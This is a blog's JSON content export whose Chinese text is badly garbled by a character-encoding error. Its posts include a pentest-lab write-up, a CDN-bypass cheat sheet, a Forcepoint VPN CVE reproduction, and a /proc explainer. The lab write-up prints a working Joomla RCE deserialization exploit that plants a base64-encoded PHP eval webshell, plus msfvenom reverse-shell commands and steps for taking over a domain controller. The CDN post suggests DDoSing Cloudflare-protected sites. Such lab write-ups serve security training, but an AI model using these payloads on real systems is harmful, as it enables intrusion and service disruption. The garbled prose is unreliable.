{"meta":{"title":"Patrilic's blog","subtitle":"ä¸å¿˜åˆå¿ƒ","description":null,"author":"Patrilic","url":"http://patrilic.top","root":"/"},"pages":[],"posts":[{"title":"Tomorrow","slug":"Tomorrow","date":"2099-12-30T16:00:00.000Z","updated":"2019-09-15T02:22:59.960Z","comments":true,"path":"2099/12/31/Tomorrow/","link":"","permalink":"http://patrilic.top/2099/12/31/Tomorrow/","excerpt":"","text":"å†™ç»™è‡ªå·± Tomorrow is not just another day in your lifeItâ€™s the next day in an â€˜it does matterâ€™ life å…¶å®å‘¢ï¼Œä¸€ç›´æƒ³æŠŠåšå®¢å˜æˆä¸€ä¸ªåªå±äºè‡ªå·±çš„å°å—ç©ºé—´ï¼Œè‡ªå·±æƒ³æ€ä¹ˆè£…é¥°å°±æ€ä¹ˆè£…é¥°ï¼Œæƒ³å†™ä»€ä¹ˆå°±å†™ä»€ä¹ˆï¼Œç”šè‡³ä¹‹å‰æœ‰æ®µæ—¶é—´åªç”¨hexo s233333 \bç°åœ¨è§‰å¾—å‘¢ï¼Œè¿˜æ˜¯ä¸€æ ·ï¼Œä¸ç”¨åœ¨æ„åˆ«äººçš„çœ¼å…‰ï¼Œè‡ªå·±åšå¹²ä»€ä¹ˆå°±åšä»€ä¹ˆï¼Œæ…¢æ…¢æŠŠè‡ªå·±æƒ³å¥½å¥½å†™çš„ä¸œè¥¿æ”¾åœ¨åšå®¢ä¸Šï¼Œç­‰ä»¥åå¹´çºªä¸Šå»äº†ï¼Œä¹Ÿç®—æ˜¯æœ‰ä¸ªçºªå¿µï½ ä»¥åè¿™é‡Œæˆ‘æ‰“ç®—å†™ä¸€ç‚¹è‡ªå·±ä»ç”Ÿæ´»ä¸­ç»å†çš„äº‹æƒ…å¾—åˆ°çš„æ„Ÿæ‚Ÿæˆ–è€…ä¸€äº›æœ‰è¶£çš„äº‹æƒ…å§ï¼Œæœ¬èº«ä¹Ÿä¸æ˜¯æƒ³ææˆçº¯æŠ€æœ¯åšå®¢çš„ ğŸ˜ -- 2019.8.28 æ—© 3ç‚¹56åˆ† 2019.8.28è¿˜æœ‰å‡ å¤©å°±è¦æ­£å¼è¿›å…¥å¤§ä¸‰çš„ç”Ÿæ´»äº†ï¼Œè¯¾è¿˜è¡Œï¼Œä¸»è¦æ˜¯æ„Ÿè§‰å¯èƒ½è¿™è¾ˆå­çš„å­¦ç”Ÿç”Ÿæ¶¯ä¹Ÿå¿«åˆ°å¤´äº†.. æœ€è¿‘ç»å†å¾ˆå¤šäº‹æƒ…ï¼Œä¹Ÿçœ‹å¼€äº†ï¼Œå¥½å¥½å­¦ä¹ ï¼Œå¥½å¥½ç”Ÿæ´»ã€‚ åŠè¯¸å›ï¼š èº«ä½“å¥åº·æ‰æ˜¯ç¬¬ä¸€ä½ ï¼Œå“ å…±å‹‰å§ æ˜å¤©åŠ æ²¹ Just fxxking do it dig fucking deep and get it done 2019.8.30å¥½åƒä»Šå¤©è¦å¼€å­¦äº†ï¼Œæ—©ç‚¹ä¼‘æ¯å§ï½ Get raw and get intense 2019.9.9å·®è·å•Š..å¤ªèœäº†ï¼Œè¿˜æœ‰ä»€ä¹ˆç†ç”±ä¸åŠªåŠ›çš„å—ï¼Ÿ å¾®å…‰ 2019.9.15 ä¸€åˆ‡æœ‰ä¸ºæ³• å¦‚æ¢¦å¹»æ³¡å½±å¦‚éœ²äº¦å¦‚ç”µ åº”ä½œå¦‚æ˜¯è§‚","categories":[{"name":"Diary","slug":"Diary","permalink":"http://patrilic.top/categories/Diary/"}],"tags":[]},{"title":"iSoonLab.org Write-up","slug":"iSoonLab.org Write-up","date":"2019-12-12T06:32:22.000Z","updated":"2019-12-12T07:26:41.417Z","comments":true,"path":"2019/12/12/iSoonLab.org Write-up/","link":"","permalink":"http://patrilic.top/2019/12/12/iSoonLab.org Write-up/","excerpt":"","text":"@Author: Patrilic@Time: 2019-12-12 14:32:22 é¢˜ç›®æ‹“æ‰‘Linux1 - solr: 192.168.21.12 Linux2 - joomla!: 192.168.21.20 Backup.sub.iSoonLab.org: 192.168.21.8 subdc.sub.iSoonLab.org: 192.168.21.4 / 10.153.69.50 DC.iSoonLab.org: 10.153.69.5 Linux1ç›®æ ‡:192.168.121.131 å¼€æ”¾8983ç«¯å£ï¼Œæ‰“å¼€æ˜¯solræœªæˆæƒï¼Œ8.1.1ç‰ˆæœ¬ï¼Œè”æƒ³åˆ°å‰æ®µæ—¶é—´å¾ˆç«çš„Apache Solr RCE https://www.freebuf.com/vuls/218730.html æ ¹æ®ç½‘ä¸Šçš„exp http://192.168.121.131:8983/solr/admin/cores?wt=json&amp;indexInfo=false å­˜åœ¨iSoon core ç¡®å®æ²¡é—®é¢˜ï¼Œå¼¹ä¸ªshellåˆ°æœ¬æœºæ¥ 1msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IP_Addr&gt; LPORT=&lt;Port_Num&gt; -f elf &gt; shell.elf å› ä¸ºsolrç”¨æˆ·æ²¡æœ‰/tmpç›®å½•å†™æƒé™ï¼Œ å¯ä»¥å‚è€ƒ@hayaå¤§æ‰‹å­çš„https://forum.90sec.com/t/topic/579 ç”¨perlæ¥æ‰§è¡Œè„šæœ¬ flagå°±åœ¨å½“å‰ç›®å½• å½“ç„¶ï¼Œä¹Ÿå¯ä»¥åœ¨/var/tmpé‡Œå†™æ–‡ä»¶ï½ Linux2ç®€å•ä¾¦æŸ¥åï¼Œå‘ç°å­˜åœ¨192.168.21.0/24ç½‘æ®µ ä½¿ç”¨msfè‡ªå¸¦çš„sock4aä½œä»£ç†å³å¯ï¼ŒLinux1åªæ˜¯ç”¨æ¥æ’•æ¥æµé‡å£å­ ä»£ç†å†…ç½‘åï¼Œå‘ç°åŒç½‘æ®µå­˜åœ¨ä¸‰å°æœºå™¨ æ‰¾åˆ°Linux2 : 192.168.21.20ï¼Œ å¼€æ”¾HTTPç«¯å£ joomla-3.4.6ç‰ˆæœ¬ï¼Œå­˜åœ¨RCEï¼Œé€šè¿‡æ„é€ expï¼Œæ‹¿åˆ°webshell 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass JSimplepieFactory&#123;&#125;class JDatabaseDriverMysql&#123;&#125;class JDatabaseDriverMysqli&#123; protected $xx; protected $connection; protected $disconnectHandlers; protected $obj; function __construct() &#123; $this-&gt;xx = new JSimplepieFactory(); $this-&gt;connection = 1; $obj = new SimplePie; $this-&gt;disconnectHandlers = [ [$obj, \"init\"], ]; &#125;&#125;class SimplePie&#123; var $sanitize; var $cache_name_function; var $feed_url; function __construct() &#123; $this-&gt;feed_url = \"system('echo \\'ZWNobyAiPD9waHAgZXZhbChcJF9QT1NUW2FdKT8+IiA+IC9ob21lL3d3d3Jvb3QvZGVmYXVsdC8xLnBocA==\\'| base64 -d | bash');JFactory::getConfig();exit;\"; $this-&gt;cache_name_function = \"assert\"; $this-&gt;sanitize = new JDatabaseDriverMysql(); &#125;&#125;$a = new JDatabaseDriverMysqli();$ser = serialize($a);echo $data = str_replace(chr(0) . '*' . chr(0), '\\0\\0\\0', $ser); 12345ç”¨æˆ·åï¼š\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0å¯†ç ï¼šMYP\";s:2:\"HS\";O:21:\"JDatabaseDriverMysqli\":4:&#123;s:5:\"\\0\\0\\0xx\";O:17:\"JSimplepieFactory\":0:&#123;&#125;s:13:\"\\0\\0\\0connection\";i:1;s:21:\"\\0\\0\\0disconnectHandlers\";a:1:&#123;i:0;a:2:&#123;i:0;O:9:\"SimplePie\":3:&#123;s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:&#123;&#125;s:19:\"cache_name_function\";s:6:\"assert\";s:8:\"feed_url\";s:149:\"system('echo \\'ZWNobyAiPD9waHAgZXZhbChcJF9QT1NUW2FdKT8+IiA+IC9ob21lL3d3d3Jvb3QvZGVmYXVsdC8xLnBocA==\\'| base64 -d | bash');JFactory::getConfig();exit;\";&#125;i:1;s:4:\"init\";&#125;&#125;s:6:\"\\0\\0\\0obj\";N;&#125; antswordè¿æ¥åï¼Œåœ¨/tmpç›®å½•ä¸Šä¼ æˆ‘ä»¬ç”Ÿæˆçš„msfæœ¨é©¬ 1msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.21.12 LPORT=6666 -f elf &gt; shell2.elf æ‹¿åˆ°shellåï¼ŒæŸ¥çœ‹uname å†…æ ¸ç‰ˆæœ¬æ¯”è¾ƒä½çš„æ¡Œé¢ç‰ˆæœ¬ï¼Œå­˜åœ¨CVE-2019-13272 EXPéœ€è¦æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶: å†…æ ¸ç‰ˆæœ¬ &lt; 5.1.17 ä¸”ä¸ºæ¡Œé¢ç‰ˆ å­˜åœ¨/home/\\ äº¤äº’å¼shell æˆåŠŸæ‹¿åˆ°ç¬¬äºŒä¸ªflag Backup.sub.iSoonLab.orgå›è¿‡æ¥çœ‹webç•Œé¢çš„æç¤º æ”¾å‡ºäº†ä¸‹ä¸€æ­¥çš„hintï¼ŒæŸ¥çœ‹å·²ç»å®‰è£…çš„è½¯ä»¶å’Œpythonç¬¬ä¸‰æ–¹åº“ ä¸‰æ¡æ€è·¯ï¼š åˆ©ç”¨impacketå’Œarpspoofè¿›è¡Œä¸­é—´äººæ”»å‡» åœ¨æœ¬æœºä¸Šè¿›è¡Œä¿¡æ¯æœé›†ï¼Œå¯»æ‰¾åˆ°åŸŸæˆå‘˜æœºå™¨çš„è·¯å­ ç³»ç»Ÿæ¼æ´ -&gt; ms17010 .etc ä¸­é—´äººæ”»å‡»ä½¿ç”¨ms15-014 å’Œ ms15-011 è¿›è¡Œç»„ç­–ç•¥åŠ«æŒï¼Œæ‹¿ä¸‹åŸŸæˆå‘˜æœºå™¨ ç¿»æœºå™¨çš„æ—¥å¿— æœ‰dayä¸Šdayï½ ### ç®€å•æ–¹æ³•: é€šè¿‡.bash_historyæ‹¿åˆ°mountå‘½ä»¤ï¼Œå­˜æœ‰æ˜æ–‡å¯†ç ï¼Œ é€šè¿‡exploit/windows/smb/psexecå³å¯æ‹¿åˆ°ç›®æ ‡æœºå™¨NT/SYSTEM ä¸­é—´äººæµ‹è¯•ä¹Ÿæ˜¯å¯è¡Œçš„ï¼Œä½¿ç”¨MS15-011åŠ«æŒç»„ç­–ç•¥ï¼Œåªæ˜¯éœ€è¦ç­‰å¾…ç»„ç­–ç•¥ç”Ÿæ•ˆ (é»˜è®¤90åˆ†é’Ÿ) &lt;æ‡’ç‹—ä¸æƒ³æˆªå›¾äº†&gt; subdc.iSoonLab.orgåœ¨backupæœºå­ä¸Šçš„C:\\Backupç¿»åˆ°äº†æ³¨å†Œè¡¨çš„å­˜æ¡£ ä¸‹è½½ä¸‹æ¥ä½¿ç”¨secretsdumpè¿›è¡Œdump æ‹¿åˆ°æœåŠ¡è´¦æˆ·åï¼Œç”¨æ¥æ„é€ ç™½é“¶ç¥¨æ®ï¼Œæ”»å‡»subdc.sub.iSoonLab.orgï¼ˆMS14068ä¹Ÿå¯ï¼‰ (æ³¨æ„å¿…é¡»å…³é—­Linux2ä¸­çš„arpspoof) ç¬¬å››ä¸ªflagåˆ°æ‰‹ï½ï½ DC.iSoonLab.orgæœ€åå°±å¾ˆç®€å•å•¦ï¼Œå­çˆ¶åŸŸä¸­å¸¸è§çš„åŒå‘ä¿¡ä»»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ ä¿¡ä»»ç¥¨æ®æ¥è¿›è¡Œæ”»å‡» åˆ©ç”¨ä¿¡ä»»ç¥¨æ® http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/ è¿™é‡Œæœ‰ä¸€ç‚¹å°é—®é¢˜: å½“æŒ‡å®škrbtgtè´¦æˆ·æ—¶ï¼Œå› ä¸ºå­çˆ¶åŸŸä¸­å­˜åœ¨ä¸¤ä¸ªkrbtgtè´¦æˆ·ï¼ŒDCsyncè½¬å‚¨æ—¶å¯èƒ½çˆ†NOT_UNIQUEï¼Œå¯ä»¥ä½¿ç”¨/allè§£å†³ åˆ©ç”¨dcsync è½¬å‚¨å­åŸŸçš„æ‰€æœ‰hash ä½¿ç”¨/Ptt è¿›è¡Œä¿¡ä»»ç¥¨æ®ä¼ é€’å³å¯ æ‹¿åˆ°åŸŸæ§æƒé™ï¼Œflagåœ¨C:\\Users\\Administraotr\\flag.txtä¸­","categories":[{"name":"Write-up","slug":"Write-up","permalink":"http://patrilic.top/categories/Write-up/"}],"tags":[{"name":"iSoonLab.org","slug":"iSoonLab-org","permalink":"http://patrilic.top/tags/iSoonLab-org/"}]},{"title":"Bypass CDN å¯»æ‰¾çœŸå®IP","slug":"Bypass CDN å¯»æ‰¾çœŸå®IP_1","date":"2019-10-09T05:12:49.000Z","updated":"2019-10-31T15:51:16.775Z","comments":true,"path":"2019/10/09/Bypass CDN å¯»æ‰¾çœŸå®IP_1/","link":"","permalink":"http://patrilic.top/2019/10/09/Bypass CDN å¯»æ‰¾çœŸå®IP_1/","excerpt":"","text":"@Author: Patrilic@Time: 2019-10-09 13:12:49 0x00 å‰è¨€ä¸ªäººè§‰å¾—ï¼Œç»•è¿‡CDNå»å¯»æ‰¾ä¸»æœºçš„çœŸå®ipï¼Œæ›´å®¹æ˜“èƒ½å¯»æ‰¾åˆ°ä¼ä¸šç½‘ç»œçš„è–„å¼±åœ°å¸¦ï¼Œæ‰€ä»¥Bypass CDNä¹Ÿå°±å˜æˆäº†è‡³å…³é‡è¦çš„ä¸€ç‚¹ 0x01 å¸¸è§Bypassæ–¹æ³•å­åŸŸåæœé›†ç”±äºæˆæœ¬é—®é¢˜ï¼Œå¯èƒ½æŸäº›å‚å•†å¹¶ä¸ä¼šå°†æ‰€æœ‰çš„å­åŸŸåéƒ½éƒ¨ç½²CDNï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬èƒ½å°½é‡çš„æœé›†å­åŸŸåï¼Œæˆ–è®¸å¯ä»¥æ‰¾åˆ°ä¸€äº›æ²¡æœ‰éƒ¨ç½²CDNçš„å­åŸŸåï¼Œæ‹¿åˆ°æŸäº›æœåŠ¡å™¨çš„çœŸå®ip/æ®µ ç„¶åå…³äºå­åŸŸåæœé›†çš„æ–¹å¼å¾ˆå¤šï¼Œå°±ä¸ä¸€ä¸€ä»‹ç»äº†ï¼Œæˆ‘å¹³æ—¶ä¸»è¦æ˜¯ä»è¿™å‡ ä¸ªæ–¹é¢æœé›†å­åŸŸåï¼š SSLè¯ä¹¦ çˆ†ç ´ Google Hacking åŒé‚®ç®±æ³¨å†Œäºº DNS åŸŸä¼ é€ é¡µé¢JSæœé›† ç½‘ç»œç©ºé—´å¼•æ“ å·¥å…·ä¹Ÿæœ‰å¾ˆå¤šå‰å®³çš„ï¼Œå¹³æ—¶æˆ‘ä¸€èˆ¬ä½¿ç”¨ OneForALL + ESD + JSfinder æ¥è¿›è¡Œæœé›† ï¼ˆESDå¯ä»¥åŠ è½½layerçš„å­—å…¸ï¼Œå¾ˆå¥½ç”¨ï¼‰ æŸ¥è¯¢DNSå†å²è§£æè®°å½•å¸¸å¸¸æœåŠ¡å™¨åœ¨è§£æåˆ°CDNæœåŠ¡å‰ï¼Œä¼šè§£æçœŸå®ipï¼Œå¦‚æœå†å²æœªåˆ é™¤ï¼Œå°±å¯èƒ½æ‰¾åˆ°å¸¸ç”¨ç½‘ç«™ï¼šhttp://viewdns.info/https://x.threatbook.cn/http://www.17ce.com/https://dnsdb.io/zh-cn/https://securitytrails.com/http://www.ip138.com/https://github.com/vincentcox/bypass-firewalls-by-DNS-history MXè®°å½•ï¼ˆé‚®ä»¶æ¢æµ‹ï¼‰è¿™ä¸ªå¾ˆç®€å•ï¼Œå¦‚æœç›®æ ‡ç³»ç»Ÿæœ‰å‘ä»¶åŠŸèƒ½ï¼Œé€šå¸¸åœ¨æ³¨å†Œç”¨æˆ·/æ‰¾å›å¯†ç ç­‰åœ°æ–¹ SSLè¯ä¹¦æ¢æµ‹æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç©ºé—´å¼•æ“è¿›è¡ŒSSLè¯ä¹¦æ¢æµ‹ 443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:www.baidu.com 443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:www.baidu.com å†æ”¾ä¸€ä¸ªæœé›†è¯ä¹¦çš„ç½‘ç«™https://crt.sh ä¸€ä¸ªå°è„šæœ¬ï¼Œå¯ä»¥å¿«é€Ÿæœé›†è¯ä¹¦ 1234567891011121314151617181920212223# -*- coding: utf-8 -*-# @Time : 2019-10-08 22:51# @Author : Patrilic# @FileName: SSL_subdomain.py# @Software: PyCharmimport requestsimport reTIME_OUT = 60def get_SSL(domain): domains = [] url = 'https://crt.sh/?q=%25.&#123;&#125;'.format(domain) response = requests.get(url,timeout=TIME_OUT) # print(response.text) ssl = re.findall(\"&lt;TD&gt;(.*?).&#123;&#125;&lt;/TD&gt;\".format(domain),response.text) for i in ssl: i += '.' + domain domains.append(i) print(domains)if __name__ == '__main__': get_SSL(\"baidu.com\") è¿˜æœ‰ä¸€ç§æ–¹å¼ï¼Œå°±æ˜¯æœé›†SSLè¯ä¹¦Hashï¼Œç„¶åéå†ipå»æŸ¥è¯¢è¯ä¹¦hashï¼Œå¦‚æœåŒ¹é…åˆ°ç›¸åŒçš„ï¼Œè¯æ˜è¿™ä¸ªipå°±æ˜¯é‚£ä¸ª åŸŸååŒæ ¹è¯ä¹¦çš„æœåŠ¡å™¨çœŸå®ip ç®€å•æ¥è¯´ï¼Œå°±æ˜¯éå†0.0.0.0/0:443ï¼Œé€šè¿‡ipè¿æ¥httpsæ—¶ï¼Œä¼šæ˜¾ç¤ºè¯ä¹¦ å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç”¨censysç­‰å¼•æ“ åè¿œåœ°åŒºæœåŠ¡å™¨è®¿é—®åœ¨åè¿œåœ°åŒºçš„æœåŠ¡å™¨è®¿é—®æ—¶ï¼Œå¯èƒ½ä¸ä¼šè®¿é—®åˆ°CDNèŠ‚ç‚¹ï¼Œè€Œæ˜¯ç›´æ¥è®¿é—®æœåŠ¡å™¨çœŸå®ip æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æä¸€ä¸ªåè¿œåœ°åŒºçš„ä»£ç†æ± ï¼Œæ¥è®¿é—®ç›®æ ‡åŸŸåï¼Œæœ‰æ¦‚ç‡å°±å¯ä»¥æ‹¿åˆ°çœŸå®ip ä¹Ÿå°±æ˜¯å¹³å¸¸è¯´çš„å¤šåœ°Ping favicon_hashåŒ¹é…åˆ©ç”¨shodançš„http.favicon.hashè¯­æ³•ï¼Œæ¥åŒ¹é…iconçš„hashå€¼ ç›´æ¥æ¨https://github.com/Ridter/get_ip_by_ico/blob/master/get_ip_by_ico.py CloudFlare Bypasså…è´¹ç‰ˆçš„cfï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡DDOSæ¥æ¶ˆè€—å¯¹æ–¹çš„æµé‡ï¼Œåªéœ€è¦æŠŠæµé‡æ‰“å…‰ï¼Œå°±ä¼šå›æ»šåˆ°åŸå§‹ip è¿˜æœ‰åˆ©ç”¨cloudflareçš„æ”¹hostè¿”å›ç¤ºä¾‹:https://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/é‡Œé¢ç»™äº†è¯¦ç»†çš„ä»‹ç»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡HOSTæ¥åˆ¤æ–­æ˜¯å¦æ˜¯çœŸå®ipå…·ä½“çœ‹æ–‡ç« å³å¯ å¥‡ç‰¹çš„pingæ¯”å¦‚å¯èƒ½æœ‰äº›åœ°æ–¹ï¼Œä½¿ç”¨çš„CDNéƒ½æ˜¯ä»¥www.xxx.edu.cnï¼Œä¾‹å¦‚www.cuit.edu.cn,www.jwc.cuit.edu.cn å¯èƒ½å»æ‰å‰ç¼€çš„wwwï¼Œå°±å¯èƒ½ç»•è¿‡CDNäº†ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯ç±»ä¼¼äºApache VirtualHost å¯å‚è€ƒhttps://httpd.apache.org/docs/2.4/en/vhosts/examples.html ä¾‹å¦‚ï¼š æˆ‘è¿™é‡Œå…¶å®æ˜¯pingäº†www.xxx.gov.cnå’Œxxx.gov.cn è¿™æ ·å°±å¯ä»¥ç»•è¿‡CDNçš„æ£€æµ‹ åˆ©ç”¨è€åŸŸååœ¨æ¢æ–°åŸŸåæ—¶ï¼Œå¸¸å¸¸å°†CDNéƒ¨ç½²åˆ°æ–°çš„åŸŸåä¸Šï¼Œè€Œè€åŸŸåç”±äºæ²¡è¿‡æœŸï¼Œå¯èƒ½æœªä½¿ç”¨CDNï¼Œç„¶åå°±å¯ä»¥ç›´æ¥è·å–æœåŠ¡å™¨çœŸå®ipã€‚ ä¾‹å¦‚patrilic.top &gt; patrilic.comåŸŸåæ›´æ–°æ—¶ï¼Œå¯èƒ½è€åŸŸååŒæ—¶è§£æåˆ°çœŸå®æœåŠ¡å™¨ï¼Œä½†æ˜¯æ²¡æœ‰éƒ¨ç½²CDN è¿™ä¸ªå¯ä»¥é€šè¿‡æœé›†åŸŸåå¤‡æ¡ˆçš„é‚®ç®±å»åæŸ¥ï¼Œå¯èƒ½ä¼šæœ‰æ„å¤–æ”¶è· æš´åŠ›åŒ¹é…æ‰¾åˆ°ç›®æ ‡æœåŠ¡å™¨IPæ®µåï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œæš´åŠ›åŒ¹é… ï¼Œä½¿ç”¨masscanæ‰«æHTTP bannerï¼Œç„¶ååŒ¹é…åˆ°ç›®æ ‡åŸŸåçš„ç›¸åŒbanner DDos/ç¤¾å·¥CDNå¹³å°ç­‰0x02 å…¶ä»–æ–¹æ³•phpinfo ssrfï¼Œæ–‡ä»¶ä¸Šä¼ ç­‰æ¼æ´ç•¥.. 0x03 å‚è€ƒé“¾æ¥ğŸ”—https://github.com/shmilylty/OneForAllhttps://github.com/FeeiCN/ESDhttps://github.com/Threezh1/JSFinderhttps://github.com/AI0TSec/blog/issues/8https://www.4hou.com/tools/8251.htmlhttps://www.freebuf.com/sectool/112583.html","categories":[{"name":"Pentest Cheat Sheet","slug":"Pentest-Cheat-Sheet","permalink":"http://patrilic.top/categories/Pentest-Cheat-Sheet/"}],"tags":[{"name":"Bypass CDN","slug":"Bypass-CDN","permalink":"http://patrilic.top/tags/Bypass-CDN/"}]},{"title":"CVE-2019-6145  Forcepoint VPN","slug":"CVE-2019-6145  Forcepoint VPN","date":"2019-09-26T16:03:55.000Z","updated":"2019-09-27T06:52:31.916Z","comments":true,"path":"2019/09/27/CVE-2019-6145  Forcepoint VPN/","link":"","permalink":"http://patrilic.top/2019/09/27/CVE-2019-6145  Forcepoint VPN/","excerpt":"","text":"@Author: Patrilic@Time: 2019-09-27 0:03:55 0x00 å‰è¨€ç¾¤é‡Œå¸ˆå‚…ä¼ äº†ä¸€ç¯‡æ¼æ´è¯¦æƒ…ï¼Œå¦‚ä¸‹ï¼šhttps://www.4hou.com/vulnerable/20515.html å…¶ä¸­ç¿»åˆ°è¿™ä¸ªçš„æ—¶å€™ï¼š è¿™ä¸å°±æ˜¯ç™½åŠ é»‘ä¹ˆ..è¿˜èƒ½è‡ªå¯ï¼Œå²‚ä¸ç¾å“‰ï½ 0x01 æ¼æ´å¤ç°å½±å“ç‰ˆæœ¬ Forcepoint VPN Windows Client &lt; 6.6.1 å¤ç° å®‰è£…çš„æ—¶å€™ä¼šè°ƒç”¨msiexec.exeï¼Œä½¿ç”¨é©±åŠ¨åŠ è½½NT/SYSTEM ç„¶åä¿è¯è‡ªå¯åŠ¨ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬èƒ½æ‘¸åˆ°è·¯å¾„å°±èƒ½æŒä¹…æ§åˆ¶ æ‰“å¼€ç¨‹åºï¼Œæˆ‘ä»¬å‘ç°ä»–ä¼šå»æŸ¥è¯¢ä¸€äº›ä¸å­˜åœ¨çš„ç›®å½•å’Œç¨‹åº 0x02 æ¼æ´åŸç†çœ‹è¿™ä¸ªå°±å¥½äº†https://www.4hou.com/vulnerable/20515.html æš´é£å“­æ³£ï¼Œä¸ä¼š ï¼ˆæˆ‘æ˜¯ä¸€ä¸ªæ²¡æœ‰æ„Ÿæƒ…çš„å¤ç°æœºå™¨ï¼‰ 0x03 å…æ€","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"http://patrilic.top/categories/æ¼æ´å¤ç°/"}],"tags":[{"name":"Forcepoint VPN","slug":"Forcepoint-VPN","permalink":"http://patrilic.top/tags/Forcepoint-VPN/"}]},{"title":"æµ…è°ˆ Linuxç³»ç»Ÿ proc","slug":"æµ…è°ˆ Linuxç³»ç»Ÿ Proc","date":"2019-09-10T16:44:23.000Z","updated":"2019-09-10T16:59:01.747Z","comments":true,"path":"2019/09/11/æµ…è°ˆ Linuxç³»ç»Ÿ Proc/","link":"","permalink":"http://patrilic.top/2019/09/11/æµ…è°ˆ Linuxç³»ç»Ÿ Proc/","excerpt":"","text":"@Author: Patrilic@Time: 2019-9-11 0:44:23 0x00 å‰è¨€æˆ‘ä»¬ç»å¸¸åœ¨CTFæ¯”èµ›é‡Œï¼Œæˆ–è€…å®é™…æ¸—é€é‡Œï¼Œä½¿ç”¨åˆ°/procè¿™ä¸ªç›®å½•ï¼Œæ¯”å¦‚å¸¸å¸¸åˆ©ç”¨/proc/self/cwdæ¥è®¿é—®è¿›ç¨‹ä¸­çš„æ–‡ä»¶ï¼Œä½¿ç”¨/proc/self/environè¯»å–ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ç­‰ 0x01 Proc åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿å®é™…ä¸Šæˆ‘ä»¬åœ¨ä»»ä½•çš„GUN/Linuxæ“ä½œç³»ç»Ÿé‡Œï¼Œéƒ½èƒ½æ‰¾åˆ°è¿™ä¸ªç›®å½•ï¼Œå¹¶ä¸”é‡Œé¢å­˜åœ¨å¤§é‡ç›®å½•ä½†æ˜¯å¦‚æœï¼Œæˆ‘ä»¬ä½¿ç”¨ ls -alæ¥æŸ¥çœ‹ å¯ä»¥çœ‹åˆ°ç»å¤§éƒ¨åˆ†æ–‡ä»¶å¤§å°ä¸º0 ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨catå‘½ä»¤è·å–å…¶ä¸­çš„å¤§é‡ä¿¡æ¯ ä¸ºä»€ä¹ˆ0å­—èŠ‚è¿˜èƒ½å­˜æœ‰å†…å®¹å‘¢ è¿™é‡Œæåˆ°ä¸€ä¸ªæ¦‚å¿µï¼šæ–‡ä»¶ç³»ç»Ÿç»´åŸºç™¾ç§‘-&gt;https://zh.wikipedia.org/wiki/Procfs è€Œprocåœ¨Unixé‡Œå¸¸å¸¸è¢«ç§°ä¸ºprocfs -&gt; proc file systemå®ƒåŒ…å«ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆå¯åŠ¨æ—¶åŠ¨æ€ç”Ÿæˆçš„æ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œç”¨äºé€šè¿‡å†…æ ¸è®¿é—®è¿›ç¨‹ä¿¡æ¯ã€‚è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿé€šå¸¸è¢«æŒ‚è½½åˆ° /proc ç›®å½•ã€‚ç”±äº /proc ä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒä¹Ÿå°±ä¸å ç”¨å­˜å‚¨ç©ºé—´ï¼Œåªæ˜¯å ç”¨æœ‰é™çš„å†…å­˜ã€‚ ç»´åŸºç™¾ç§‘-&gt;https://zh.wikipedia.org/wiki/Procfs æ‰€ä»¥è¯´ï¼Œå…¶å®/procç›®å½•æ›´å¤šçš„æ˜¯èµ·åˆ°ä¸€ä¸ªç±»ä¼¼äºæ¥å£çš„ä½œç”¨ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨catå‘½ä»¤è·å–æ—¶ï¼Œå®ƒä¼šä»å†…å­˜ä¸­è·å–ä¿¡æ¯ï¼Œæ¥è¿”å›ç»™ç”¨æˆ·ï¼Œè€Œç›®å½•ä¸­çš„æ•°å­—ï¼Œå…¶å®å°±æ˜¯PIDå·ã€‚ /proc/$PID/cmdline å¯åŠ¨è¿›ç¨‹æ—¶æ‰§è¡Œçš„å‘½ä»¤ /proc/$PID/environ è¯¥æ–‡ä»¶ä¿å­˜è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ /proc/$PID/cwd ä¸€ä¸ªç¬¦å·è¿æ¥, æŒ‡å‘è¿›ç¨‹å½“å‰çš„å·¥ä½œç›®å½• /proc/$PID/exe ä¸€ä¸ªç¬¦å·è¿æ¥, æŒ‡å‘è¢«æ‰§è¡Œçš„äºŒè¿›åˆ¶ä»£ç  /proc/$PID/fd è¿›ç¨‹æ‰€æ‰“å¼€çš„æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªç¬¦å·è¿æ¥åœ¨è¯¥å­ç›®å½•é‡Œ, ä»¥æ–‡ä»¶æè¿°ç¬¦å‘½å, è¿™ä¸ªåå­—å®é™…ä¸Šæ˜¯æŒ‡å‘çœŸæ­£çš„æ–‡ä»¶çš„ç¬¦å·è¿æ¥ /proc/$PID/attr è¿›ç¨‹çš„å±æ€§ 0x02 